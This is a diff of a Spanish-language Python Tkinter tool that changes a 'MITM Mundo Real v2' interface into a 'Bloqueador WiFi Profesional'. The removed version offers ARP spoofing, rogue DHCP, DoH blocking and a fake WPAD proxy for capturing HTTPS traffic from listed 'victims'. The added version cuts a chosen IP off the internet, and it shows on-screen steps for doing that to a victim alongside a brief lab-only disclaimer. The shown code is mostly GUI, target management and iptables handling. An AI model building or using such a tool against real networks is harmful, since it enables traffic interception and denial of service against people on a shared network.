-        datos['activo'] = False
-        datos['evento'].set()
-        datos['evento_dns'].set()
-        datos['evento_doh'].set()
-        datos['evento_wpad'].set()
-        hilos = [datos['hilo'], datos['hilo_dns'], datos['hilo_doh'], datos['hilo_wpad']]
 
-    for h in hilos:
-        if h and h.is_alive():
-            h.join(timeout=5)
+        OBJETIVOS[ip]['activo'] = False
+        OBJETIVOS[ip]['evento'].set()
 
-    log_msg(f"🛑 [{datos['nombre']}] Detenido")
-    actualizar()
+    log(f"🟢 DESBLOQUEADO: {OBJETIVOS[ip]['nombre']} ({ip})")
+    actualizar_lista()
 
-def eliminar(ip):
-    global victimas
-    with victimas_lock:
-        if ip not in victimas:
+def eliminar_objetivo(ip):
+    """Elimina IP de la lista"""
+    global OBJETIVOS, LOCK_OBJETIVOS
+
+    with LOCK_OBJETIVOS:
+        if ip not in OBJETIVOS:
             return
-        if victimas[ip]['activo']:
-            detener(ip)
-        nombre = victimas[ip]['nombre']
-        del victimas[ip]
-    log_msg(f"🗑 {nombre} eliminado")
-    actualizar()
+
+        if OBJETIVOS[ip]['activo']:
+            detener_bloqueo(ip)
+            time.sleep(0.5)
+
+        nombre = OBJETIVOS[ip]['nombre']
+        del OBJETIVOS[ip]
+
+    log(f"🗑 Eliminado: {nombre}")
+    actualizar_lista()
 
 def iniciar_todos():
-    with victimas_lock:
-        ips = [ip for ip in victimas if not victimas[ip]['activo']]
+    """Inicia bloqueo de todos los objetivos"""
+    global OBJETIVOS, LOCK_OBJETIVOS
+
+    with LOCK_OBJETIVOS:
+        ips = [ip for ip in OBJETIVOS if not OBJETIVOS[ip]['activo']]
+
     for ip in ips:
-        iniciar(ip)
-        time.sleep(0.3)
+        iniciar_bloqueo(ip)
+        time.sleep(0.3)  # Pequeño delay entre inicios
 
 def detener_todos():
-    with victimas_lock:
-        ips = [ip for ip, d in victimas.items() if d['activo']]
+    """Detiene todos los bloqueos"""
+    global OBJETIVOS, LOCK_OBJETIVOS
+
+    with LOCK_OBJETIVOS:
+        ips = [ip for ip, d in OBJETIVOS.items() if d['activo']]
+
     for ip in ips:
-        detener(ip)
+        detener_bloqueo(ip)
+        time.sleep(0.1)
 
 def emergencia():
-    log_msg("\n🚨 EMERGENCIA TOTAL")
+    """Restauración completa del sistema"""
+    log("\n🚨 RESTAURANDO SISTEMA...")
+
     detener_todos()
     time.sleep(1)
-    os.system("iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null")
-    log_msg("✅ Sistema restaurado")
-    messagebox.showinfo("Listo", "Restaurado")
 
-def actualizar():
-    for w in frame_lista.winfo_children():
-        w.destroy()
+    # Limpiar todas las reglas de iptables
+    os.system("iptables -F 2>/dev/null")
+    os.system("iptables -t nat -F 2>/dev/null")
 
-    with victimas_lock:
-        if not victimas:
+    log("✅ Sistema restaurado")
+    messagebox.showinfo("Listo", "Todas las reglas eliminadas")
+
+def actualizar_lista():
+    """Actualiza la lista visual de objetivos"""
+    # Limpiar frame
+    for widget in frame_lista.winfo_children():
+        widget.destroy()
+
+    global OBJETIVOS, LOCK_OBJETIVOS
+
+    with LOCK_OBJETIVOS:
+        if not OBJETIVOS:
             tk.Label(frame_lista, text="Sin objetivos", fg="gray", bg="white").pack(pady=20)
             return
-        items = list(victimas.items())
 
-    for ip, d in items:
-        color = "#e74c3c" if d['activo'] else "#ecf0f1"
-        estado = "🔴 ACTIVO" if d['activo'] else "⚪ OFF"
+        items = list(OBJETIVOS.items())
 
-        frame = tk.Frame(frame_lista, bg=color, padx=5, pady=3, relief=tk.RIDGE, bd=2)
-        frame.pack(fill=tk.X, pady=2)
+    for ip, datos in items:
+        # Color según estado
+        color = "#e74c3c" if datos['activo'] else "#ecf0f1"  # Rojo si bloqueado, gris si no
+        estado_texto = "🔴 BLOQUEADO" if datos['activo'] else "⚪ Inactivo"
 
-        tk.Label(frame, text=f"{d['nombre']} | {ip} | {estado}", 
-                bg=color, width=40, anchor="w", font=("Consolas", 9, "bold")).pack(side=tk.LEFT)
-        tk.Label(frame, text=d['modo'], bg=color, font=("Arial", 8)).pack(side=tk.LEFT, padx=5)
+        frame = tk.Frame(frame_lista, bg=color, padx=5, pady=3, relief=tk.RIDGE, bd=1)
+        frame.pack(fill=tk.X, pady=1, padx=5)
 
-        bf = tk.Frame(frame, bg=color)
-        bf.pack(side=tk.RIGHT)
+        # Info
+        tk.Label(frame, 
+                text=f"{datos['nombre']} | {ip} | {datos['mac']} | {estado_texto}", 
+                bg=color, 
+                width=60, 
+                anchor="w",
+                font=("Consolas", 9, "bold" if datos['activo'] else "normal")
+        ).pack(side=tk.LEFT)
 
-        if d['activo']:
-            tk.Button(bf, text="⏹", bg="orange", command=lambda i=ip: detener(i)).pack(side=tk.LEFT, padx=1)
+        # Botones
+        frame_botones = tk.Frame(frame, bg=color)
+        frame_botones.pack(side=tk.RIGHT)
+
+        if datos['activo']:
+            tk.Button(frame_botones, 
+                     text="DESBLOQUEAR", 
+                     bg="#27ae60", 
+                     fg="white",
+                     command=lambda i=ip: detener_bloqueo(i)
+            ).pack(side=tk.LEFT, padx=2)
         else:
-            tk.Button(bf, text="▶", bg="green", fg="white", command=lambda i=ip: iniciar(i)).pack(side=tk.LEFT, padx=1)
-        tk.Button(bf, text="🗑", fg="red", command=lambda i=ip: eliminar(i)).pack(side=tk.LEFT, padx=1)
+            tk.Button(frame_botones, 
+                     text="BLOQUEAR", 
+                     bg="#c0392b", 
+                     fg="white",
+                     command=lambda i=ip: iniciar_bloqueo(i)
+            ).pack(side=tk.LEFT, padx=2)
 
-def on_close():
-    with victimas_lock:
-        activos = sum(1 for d in victimas.values() if d['activo'])
-    if activos > 0 and messagebox.askyesno("Salir", f"{activos} activos. ¿Restaurar?"):
-        emergencia()
-    ventana.destroy()
+        tk.Button(frame_botones, 
+                 text="X", 
+                 fg="red",
+                 command=lambda i=ip: eliminar_objetivo(i)
+        ).pack(side=tk.LEFT, padx=2)
 
-def init():
-    if not is_root():
-        messagebox.showerror("Error", "Ejecutar como root")
+def cerrar_aplicacion():
+    """Cierra aplicación de forma segura"""
+    global OBJETIVOS, LOCK_OBJETIVOS
+
+    with LOCK_OBJETIVOS:
+        activos = sum(1 for d in OBJETIVOS.values() if d['activo'])
+
+    if activos > 0:
+        respuesta = messagebox.askyesnocancel("Salir", 
+            f"Hay {activos} IPs bloqueadas.\n\n"
+            "¿Restaurar sistema antes de salir?\n"
+            "(Si = Restaurar y salir, No = Salir sin restaurar, Cancelar = No salir)")
+
+        if respuesta is True:  # Si
+            emergencia()
+            ventana.destroy()
+        elif respuesta is False:  # No
+            ventana.destroy()
+        # Cancelar = no hacer nada
+    else:
+        ventana.destroy()
+
+def inicializar():
+    """Inicialización de la aplicación"""
+    global IP_GATEWAY, IP_LOCAL, MAC_LOCAL
+
+    # Verificar root
+    if not verificar_root():
+        messagebox.showerror("ERROR", 
+            "Esta herramienta requiere privilegios de root.\n\n"
+            "Ejecutar como:
+"
+            "sudo python3 bloqueador_wifi.py")
         sys.exit(1)
-    if not get_network_info():
-        messagebox.showerror("Error", "No se pudo obtener info red")
+
+    # Obtener info de red
+    if not obtener_info_red():
+        messagebox.showerror("ERROR", "No se pudo obtener información de red")
         sys.exit(1)
 
-    enable_forward()
-    lbl_info.config(text=f"Gateway: {ip_gateway} | Tu IP: {ip_atacante}")
+    # Activar forwarding
+    activar_forwarding()
 
-    log_msg("="*60)
-    log_msg("🔥 MITM MUNDO REAL v2 - DoH Killer Dinámico + WPAD Proxy")
-    log_msg("="*60)
-    log_msg("MODOS:")
-    log_msg("• dhcp_agresivo: Gana al router DHCP")
-    log_msg("• rapido: ARP Híbrido (rápido 30s, luego sigiloso)")
-    log_msg("• sigiloso: ARP Pasivo puro")
-    log_msg("• doh_killer: Bloquea DoH dinámicamente (detecta cualquier IP)")
-    log_msg("• wpad: Captura tráfico HTTPS via WPAD fake proxy")
-    log_msg("• total: Todo junto (ARP + DoH Killer + WPAD)")
-    log_msg("="*60)
+    # Actualizar label de info
+    lbl_info.config(text=f"Gateway: {IP_GATEWAY} | Tu IP: {IP_LOCAL} | MAC: {MAC_LOCAL}")
 
-# ============== GUI ==============
+    # Iniciar actualización de log
+    actualizar_log()
+
+    # Log inicial
+    log("="*50)
+    log("🔴 BLOQUEADOR WIFI PROFESIONAL")
+    log("="*50)
+    log(f"✓ Gateway: {IP_GATEWAY}")
+    log(f"✓ Tu IP: {IP_LOCAL}")
+    log(f"✓ Interfaz: {INTERFACE}")
+    log("")
+    log("INSTRUCCIONES:")
+    log("1. Ingresar IP de la víctima")
+    log("2. Click en 'AGREGAR'")
+    log("3. Click en 'BLOQUEAR'")
+    log("4. La víctima NO podrá navegar")
+    log("")
+    log("⚠️  USO EXCLUSIVO PARA LABORATORIO EDUCATIVO")
+    log("="*50)
+
+# ============== INTERFAZ GRÁFICA ==============
+
 ventana = tk.Tk()
-ventana.title("MITM Mundo Real v2 - DoH Killer + WPAD")
-ventana.geometry("950x750")
+ventana.title("Bloqueador WiFi Profesional - Laboratorio")
+ventana.geometry("800x600")
 
-tk.Label(ventana, text="🔥 MITM MUNDO REAL v2 - DoH Killer Dinámico + WPAD Fake Proxy", 
-        bg="#c0392b", fg="white", font=("Arial", 12, "bold"), pady=10).pack(fill=tk.X)
+# Header
+tk.Label(ventana, 
+        text="🔴 BLOQUEADOR WIFI - CORTE TOTAL DE INTERNET", 
+        bg="#8e44ad", 
+        fg="white",
+        font=("Arial", 14, "bold"),
+        pady=10
+).pack(fill=tk.X)
 
-lbl_info = tk.Label(ventana, text="Inicializando...", bg="#e74c3c", fg="white")
+# Info de red
+lbl_info = tk.Label(ventana, 
+                   text="Obteniendo información de red...", 
+                   bg="#9b59b6", 
+                   fg="white",
+                   font=("Arial", 10))
 lbl_info.pack(fill=tk.X)
 
-# Input
-frm = tk.LabelFrame(ventana, text="Nuevo Objetivo", padx=10, pady=10)
-frm.pack(pady=10, padx=10, fill=tk.X)
+# Frame de entrada
+frame_entrada = tk.LabelFrame(ventana, text="Agregar Objetivo", padx=10, pady=10)
+frame_entrada.pack(pady=10, padx=10, fill=tk.X)
 
-tk.Label(frm, text="IP:").grid(row=0, column=0)
-entrada_ip = tk.Entry(frm, width=18, font=("Consolas", 11))
-entrada_ip.grid(row=0, column=1, padx=5)
-entrada_ip.insert(0, "192.168.1.")
+tk.Label(frame_entrada, text="IP Objetivo:").grid(row=0, column=0, sticky="w")
+entry_ip = tk.Entry(frame_entrada, width=20, font=("Consolas", 11))
+entry_ip.grid(row=0, column=1, padx=5)
+entry_ip.insert(0, "192.168.1.")
 
-tk.Label(frm, text="Nombre:").grid(row=0, column=2)
-entrada_nombre = tk.Entry(frm, width=15, font=("Consolas", 11))
-entrada_nombre.grid(row=0, column=3, padx=5)
+tk.Label(frame_entrada, text="Nombre:").grid(row=0, column=2, sticky="w", padx=(10,0))
+entry_nombre = tk.Entry(frame_entrada, width=20, font=("Consolas", 11))
+entry_nombre.grid(row=0, column=3, padx=5)
 
-tk.Label(frm, text="Modo:").grid(row=0, column=4)
-modo_sel = ttk.Combobox(frm, values=["dhcp_agresivo", "rapido", "sigiloso", "doh_killer", "wpad", "total"], width=15)
-modo_sel.grid(row=0, column=5, padx=5)
-modo_sel.set("total")
+tk.Button(frame_entrada, 
+         text="➕ AGREGAR", 
+         bg="#3498db", 
+         fg="white",
+         font=("Arial", 10, "bold"),
+         command=agregar_objetivo
+).grid(row=0, column=4, padx=10)
 
-tk.Button(frm, text="➕ Agregar", command=agregar, bg="#2980b9", fg="white", 
-         font=("Arial", 10, "bold")).grid(row=0, column=6, padx=10)
+# Frame de lista
+frame_lista_container = tk.LabelFrame(ventana, text="Objetivos", padx=5, pady=5)
+frame_lista_container.pack(pady=5, padx=10, fill=tk.X)
 
-# Lista
-frm_lista = tk.LabelFrame(ventana, text="Objetivos", padx=5, pady=5)
-frm_lista.pack(pady=5, padx=10, fill=tk.X)
-frame_lista = tk.Frame(frm_lista, bg="white")
+frame_lista = tk.Frame(frame_lista_container, bg="white")
 frame_lista.pack(fill=tk.X)
 
-# Botones
-tk.Button(ventana, text="▶️ INICIAR TODOS", command=iniciar_todos, 
-         bg="#27ae60", fg="white", width=20, font=("Arial", 11, "bold")).pack(pady=5)
-tk.Button(ventana, text="⏹️ DETENER TODOS", command=detener_todos, 
-         bg="#f39c12", fg="white", width=20, font=("Arial", 11, "bold")).pack(pady=5)
-tk.Button(ventana, text="🚨 RESTAURAR TODO", command=emergencia, 
-         bg="#c0392c", fg="white", width=25, font=("Arial", 12, "bold")).pack(pady=10)
+# Botones de control
+tk.Button(ventana, 
+         text="🔴 BLOQUEAR TODOS", 
+         bg="#c0392b", 
+         fg="white",
+         font=("Arial", 12, "bold"),
+         width=20,
+         command=iniciar_todos
+).pack(pady=5)
+
+tk.Button(ventana, 
+         text="🟢 DESBLOQUEAR TODOS", 
+         bg="#27ae60", 
+         fg="white",
+         font=("Arial", 12, "bold"),
+         width=20,
+         command=detener_todos
+).pack(pady=5)
+
+tk.Button(ventana, 
+         text="🚨 RESTAURAR SISTEMA", 
+         bg="#2c3e50", 
+         fg="white",
+         font=("Arial", 12, "bold"),
+         width=25,
+         command=emergencia
+).pack(pady=10)
 
 # Log
-frm_log = tk.LabelFrame(ventana, text="Log", padx=5, pady=5)
-frm_log.pack(pady=5, padx=10, fill=tk.BOTH, expand=True)
-widget_salida = scrolledtext.ScrolledText(frm_log, width=100, height=20, 
-                                         font=("Consolas", 9), bg="#2c3e50", fg="#00ff00")
-widget_salida.pack(fill=tk.BOTH, expand=True)
+frame_log = tk.LabelFrame(ventana, text="Log de Actividad", padx=5, pady=5)
+frame_log.pack(pady=5, padx=10, fill=tk.BOTH, expand=True)
 
-ventana.protocol("WM_DELETE_WINDOW", on_close)
-init()
-ventana.mainloop()
+txt_log = scrolledtext.ScrolledText(frame_log, 
+                                   width=80, 
+                                   height=15,
+                                   font=("Consolas", 9),
+                                   bg="#2c3e50",
+                                   fg="#00ff00")
+txt_log.pack(fill=tk.BOTH, expand=True)
+
+# Configurar cierre
+ventana.protocol("WM_DELETE_WINDOW", cerrar_aplicacion)
+
+# Inicializar
+inicializar()
+
+# Iniciar loop
+tk.mainloop()
